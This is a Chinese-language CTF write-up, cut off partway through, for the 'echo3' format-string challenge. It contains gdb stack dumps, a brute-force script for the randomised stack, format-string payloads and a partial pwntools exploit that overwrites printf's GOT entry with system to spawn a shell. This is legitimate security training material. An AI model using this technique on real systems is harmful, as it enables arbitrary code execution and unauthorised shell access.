    0096| 0xffffae1c --> 0x0 
    0100| 0xffffae20 --> 0x0 
    0104| 0xffffae24 --> 0x0 
    0108| 0xffffae28 --> 0x0 
    0112| 0xffffae2c --> 0x0 
    0116| 0xffffae30 --> 0x0 
    0120| 0xffffae34 --> 0x0 
    0124| 0xffffae38 --> 0x0 
    0128| 0xffffae3c --> 0x0 
    0132| 0xffffae40 --> 0x0 
    0136| 0xffffae44 --> 0x0 
    0140| 0xffffae48 --> 0x0 
    0144| 0xffffae4c --> 0x0 
    0148| 0xffffae50 --> 0x0 
    0152| 0xffffae54 --> 0x0 
    0156| 0xffffae58 --> 0x0 
    0160| 0xffffae5c --> 0x0 
    0164| 0xffffae60 --> 0x0 
    0168| 0xffffae64 --> 0x0 
    0172| 0xffffae68 --> 0x0 
    0176| 0xffffae6c --> 0x0 
    0180| 0xffffae70 --> 0x0 
    0184| 0xffffae74 --> 0x0
是不是很蛇皮，看到的根本不是很正常的栈结构，栈的底部全部都是0 ，本来应该有main函数的返回地址，和程序最开始环境变量
`v3 = alloca(16 * (((buf & 0x3039u) + 30) / 0x10));`
这一句造成了上面那种蛇皮栈的情况，通过测试，我们可以发现：
    import random
    for x in xrange(1,50):
        buf= random.randint(0,0xffffffff)
        a=16 * (((buf & 0x3039) + 30) / 0x10)
        print "aaaaaa-->"+hex(a)
    '''
    输出：
    aaaaaa-->0x3040
    aaaaaa-->0x2030
    aaaaaa-->0x3040
    aaaaaa-->0x40
    aaaaaa-->0x2020
    aaaaaa-->0x2040
    aaaaaa-->0x40
    aaaaaa-->0x30
    aaaaaa-->0x3030
    aaaaaa-->0x1010
    aaaaaa-->0x3040
    aaaaaa-->0x1030
    aaaaaa-->0x2040
    aaaaaa-->0x1020
    aaaaaa-->0x2030
    aaaaaa-->0x50
    aaaaaa-->0x3020
    aaaaaa-->0x2020
    aaaaaa-->0x1040
    aaaaaa-->0x3040
    aaaaaa-->0x30
    aaaaaa-->0x1030
    aaaaaa-->0x30
    aaaaaa-->0x2020
    aaaaaa-->0x2010
    aaaaaa-->0x20
    aaaaaa-->0x3020
    aaaaaa-->0x1050
    aaaaaa-->0x20
    aaaaaa-->0x50
    aaaaaa-->0x1010
    aaaaaa-->0x1020
    aaaaaa-->0x3050
    aaaaaa-->0x1020
    aaaaaa-->0x2040
    aaaaaa-->0x40
    aaaaaa-->0x40
    aaaaaa-->0x10
    aaaaaa-->0x1020
    aaaaaa-->0x3040
    aaaaaa-->0x30
    aaaaaa-->0x2020
    aaaaaa-->0x3020
    aaaaaa-->0x30
    aaaaaa-->0x40
    aaaaaa-->0x1040
    aaaaaa-->0x20
    aaaaaa-->0x1030
    aaaaaa-->0x1020
    '''
这里会造成分配0x10，0x20，0x30,0x40,0x50,0x1020,0x1030等的栈空间，也就是会导致esp-这些数值之一
那我们要得出正常的栈分布情况的话，就需要在gdb调试里面把这些被减去的加回来（这里用0x20 做例子）
首先在`text:08048774 sub esp, eax`下个断点，设置set $eax=0x20
然后在printf函数下个断点，接着c一下继续运行
就可以看到正常的栈分布空间了：
    0000| 0xffffcdec --> 0x804864b (:  add    esp,0x10)
    0004| 0xffffcdf0 --> 0x804a080 ("%43$p-%42$p-%30$p-%31$p\n")
    0008| 0xffffcdf4 --> 0x804a080 ("%43$p-%42$p-%30$p-%31$p\n")//偏移1
    0012| 0xffffcdf8 --> 0x1000 
    0016| 0xffffcdfc --> 0x1 
    0020| 0xffffce00 --> 0x5f8bfd11 
    0024| 0xffffce04 --> 0x804829c --> 0x62696c00 ('')
    0028| 0xffffce08 --> 0xf7ffd918 --> 0x0 
    0032| 0xffffce0c --> 0x0 
    0036| 0xffffce10 --> 0xffffce4e --> 0x30804 
    0040| 0xffffce14 --> 0xf7e05018 --> 0x3eab 
    0044| 0xffffce18 --> 0xf7e5a21b ()
    0048| 0xffffce1c --> 0x80485d2 ()
    0052| 0xffffce20 --> 0xf7fe77eb ()
    0056| 0xffffce24 --> 0x0 
    0060| 0xffffce28 --> 0xffffce00 --> 0x5f8bfd11 
    0064| 0xffffce2c --> 0x36a9a200 
    0068| 0xffffce30 --> 0xffffce98 --> 0x0 
    0072| 0xffffce34 --> 0x804a000 --> 0x8049f10 --> 0x1 
    0076| 0xffffce38 --> 0xffffce98 --> 0x0 
    0080| 0xffffce3c --> 0x804877b ()
    0084| 0xffffce40 --> 0x804a000 --> 0x8049f10 --> 0x1//leak_stack-0x10c
    0088| 0xffffce44 --> 0x804a060 --> 0x5f8bfd11 //leak_stack-0x108
    0092| 0xffffce48 --> 0xf7ed02ac ()
    0096| 0xffffce4c --> 0x804874a ()
    0100| 0xffffce50 --> 0x3 
    0104| 0xffffce54 --> 0x804a060 --> 0x5f8bfd11 
    0108| 0xffffce58 --> 0x4 
    0112| 0xffffce5c --> 0x80486a6 ()
    0116| 0xffffce60 --> 0x8000 
    0120| 0xffffce64 --> 0xf7fac000 --> 0x1b1db0 
    0124| 0xffffce68 --> 0xffffcf4c --> 0xffffd175 ("XDG_SEAT=seat0")//偏移30
    0128| 0xffffce6c --> 0xffffcf44 --> 0xffffd150 ("./echo3")//偏移31
    0132| 0xffffce70 --> 0x1 
    0136| 0xffffce74 --> 0x0 
    0140| 0xffffce78 --> 0xffffcf4c --> 0xffffd175 ("XDG_SEAT=seat0")
    0144| 0xffffce7c --> 0x3 
    0148| 0xffffce80 --> 0xba42216b 
    0152| 0xffffce84 --> 0x3fb24399 
    0156| 0xffffce88 --> 0xffffcf4c --> 0xffffd175 ("XDG_SEAT=seat0")
    0160| 0xffffce8c --> 0x36a9a200 
    0164| 0xffffce90 --> 0xffffceb0 --> 0x1 
    0168| 0xffffce94 --> 0x0 
    0172| 0xffffce98 --> 0x0 
    0176| 0xffffce9c --> 0xf7e12637 ()//偏移43，泄漏libc
    0180| 0xffffcea0 --> 0xf7fac000 --> 0x1b1db0 
    0184| 0xffffcea4 --> 0xf7fac000 --> 0x1b1db0 
    0188| 0xffffcea8 --> 0x0 
    0192| 0xffffceac --> 0xf7e12637 ()
    0196| 0xffffceb0 --> 0x1 
    0200| 0xffffceb4 --> 0xffffcf44 --> 0xffffd150 ("./echo3")
    0204| 0xffffceb8 --> 0xffffcf4c --> 0xffffd175 ("XDG_SEAT=seat0")
    0208| 0xffffcebc --> 0x0 
    0212| 0xffffcec0 --> 0x0 
    0216| 0xffffcec4 --> 0x0 
    0220| 0xffffcec8 --> 0xf7fac000 --> 0x1b1db0 
    0224| 0xffffcecc --> 0xf7ffdc04 --> 0x0 
    0228| 0xffffced0 --> 0xf7ffd000 --> 0x23f3c 
    0232| 0xffffced4 --> 0x0 
    0236| 0xffffced8 --> 0xf7fac000 --> 0x1b1db0 
    0240| 0xffffcedc --> 0xf7fac000 --> 0x1b1db0 
    0244| 0xffffcee0 --> 0x0 
    0248| 0xffffcee4 --> 0x8c4d349 
    0252| 0xffffcee8 --> 0x35125d59 
    0256| 0xffffceec --> 0x0 
    0260| 0xffffcef0 --> 0x0 
    0264| 0xffffcef4 --> 0x0 
    0268| 0xffffcef8 --> 0x1 
    0272| 0xffffcefc --> 0x80484b0 ()
    0276| 0xffffcf00 --> 0x0 
    0280| 0xffffcf04 --> 0xf7fee010 ()
    0284| 0xffffcf08 --> 0xf7fe8880 ()
    0288| 0xffffcf0c --> 0x804a000 --> 0x8049f10 --> 0x1 
    0292| 0xffffcf10 --> 0x1 
    0296| 0xffffcf14 --> 0x80484b0 ()
    --More--(75/100)
    0300| 0xffffcf18 --> 0x0 
    0304| 0xffffcf1c --> 0x80484e2 (t)
    0308| 0xffffcf20 --> 0x804868f ()
    0312| 0xffffcf24 --> 0x1 
    0316| 0xffffcf28 --> 0xffffcf44 --> 0xffffd150 ("./echo3")
    0320| 0xffffcf2c --> 0x80487a0 (:  push   ebp)
    0324| 0xffffcf30 --> 0x8048800 (:  repz ret)
    0328| 0xffffcf34 --> 0xf7fe8880 (:    push   ebp)
    0332| 0xffffcf38 --> 0xffffcf3c --> 0xf7ffd918 --> 0x0 
    0336| 0xffffcf3c --> 0xf7ffd918 --> 0x0 
    0340| 0xffffcf40 --> 0x1 
    0344| 0xffffcf44 --> 0xffffd150 ("./echo3")//偏移85
    0348| 0xffffcf48 --> 0x0 
    0352| 0xffffcf4c --> 0xffffd175 ("XDG_SEAT=seat0")//偏移87,leak_stack
    0356| 0xffffcf50 --> 0xffffd184 ("XDG_SESSION_ID=c1")
    0360| 0xffffcf54 --> 0xffffd196 ("LC_IDENTIFICATION=zh_CN.UTF-8")
    0364| 0xffffcf58 --> 0xffffd1b4 ("LC_TELEPHONE=zh_CN.UTF-8")
    0368| 0xffffcf5c --> 0xffffd1cd ("DISPLAY=:0")
    0372| 0xffffcf60 --> 0xffffd1d8 ("QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1")
    0376| 0xffffcf64 --> 0xffffd1fb ("JOB=dbus")
    0380| 0xffffcf68 --> 0xffffd204 ("GNOME_KEYRING_CONTROL=")
    0384| 0xffffcf6c --> 0xffffd21b ("GNOME_DESKTOP_SESSION_ID=this-is-deprecated")
    0388| 0xffffcf70 --> 0xffffd247 ("DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path")
    0392| 0xffffcf74 --> 0xffffd27a ("QT_QPA_PLATFORMTHEME=appmenu-qt5")
    0396| 0xffffcf78 --> 0xffffd29b ("LOGNAME=zeref")
在这里，我们就看到了正常的栈分布情况，但是这种情况会随着你上面设置的eax的值不同而不同，上面我是用set
$eax=0x20作为例子的，如果你用其他的那么下面我用的偏移都会跟你的不一样
那么如果找到这一种情况呢？
我们就需要进行爆破，在上面的栈分布中可以看到：
`0176| 0xffffce9c --> 0xf7e12637 ()`
那么如果栈分布里面出现了这样一个内容，就说明，这个栈的分布是我们想要的
爆破代码如下：
    while True:
        p = process('./echo3')
        #p = remote('hackme.inndy.tw',7720)
        payload = '%43$p#%30$p'
        #43的偏移出就应该是__libc_start_main的位置，这个通过自己在gdb调试中测试出来
        #注意，gdb调试的时候用的不是set $eax=0x20，那么偏移也会不同
        p.sendline(payload)
        data = p.recvuntil('#',drop = True)
        if data[-3:] == '637':
            break
        p.close()
找到栈的分布后，我们就可以操作了
首先泄漏出栈的地址来，就在envir变量的位置就可以泄漏
接着我们发现栈里面有这些指向指针的指针：
    0084| 0xffffce40 --> 0x804a000 --> 0x8049f10 --> 0x1//leak_stack-0x10c
    0088| 0xffffce44 --> 0x804a060 --> 0x5f8bfd11 //leak_stack-0x108
    ....
    0124| 0xffffce68 --> 0xffffcf4c --> 0xffffd175 ("XDG_SEAT=seat0")//偏移30
    0128| 0xffffce6c --> 0xffffcf44 --> 0xffffd150 ("./echo3")//偏移31
    ....
    0344| 0xffffcf44 --> 0xffffd150 ("./echo3")//偏移85
    0348| 0xffffcf48 --> 0x0 
    0352| 0xffffcf4c --> 0xffffd175 ("XDG_SEAT=seat0")//偏移87,leak_stack
于是我们就可以通过操作这些指针，实现间接的写，将printf的got改成system，然后发送“/bin/sh\x00”，实现getshell
具体分三步
第一：
将
    0124| 0xffffce68 --> 0xffffcf4c --> 0xffffd175 ("XDG_SEAT=seat0")//偏移30
    0128| 0xffffce6c --> 0xffffcf44 --> 0xffffd150 ("./echo3")//偏移31
改成
    0124| 0xffffce68 --> 0xffffcf4c --> 0xffffce40//leak_stack-0x10c
    0128| 0xffffce6c --> 0xffffcf44 --> 0xffffce44//leak_stack-0x108
第二：
将
    0344| 0xffffcf44 --> 0xffffce40 //偏移85
    0348| 0xffffcf48 --> 0x0 
    0352| 0xffffcf4c --> 0xffffce44//偏移87,leak_stack
改成
    0344| 0xffffcf44 --> 0xffffce40 -->printf_got//偏移85
    0348| 0xffffcf48 --> 0x0 
    0352| 0xffffcf4c --> 0xffffce44 -->printf_got+2//偏移87,leak_stack
第三
将
    0084| 0xffffce40 --> printf_got -->//leak_stack-0x10c
    0088| 0xffffce44 --> printf_got+2 -->  //leak_stack-0x108
改成：
    0084| 0xffffce40 --> printf_got -->system+2 //leak_stack-0x10c
    0088| 0xffffce44 --> printf_got+2 -->system //leak_stack-0x108
这个的核心就在于：
如果 A -> B ->C ，那么aaaa%A$n的作用是：将4赋值给C
理解了这个间接写的核心，就很容易理解上面的三次操作了
完整的exp:
    #!/usr/bin/env python
    from pwn import *
    context.log_level='debug'
    #libc = ELF('./libc-2.23.so.i386')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    elf = ELF('./echo3')
    def sd(content):
        p.send(content)
    def sl(content):
        p.sendline(content)
    def rc():
        return p.recv()
    def ru(content):
        return p.recvuntil(content)
    while True:
        p = process('./echo3')
        #p = remote('hackme.inndy.tw',7720)
        payload = '%43$p#%30$p'# %43$p-%42$p-%30$p-%31$p
        p.sendline(payload)
        data = p.recvuntil('#',drop = True)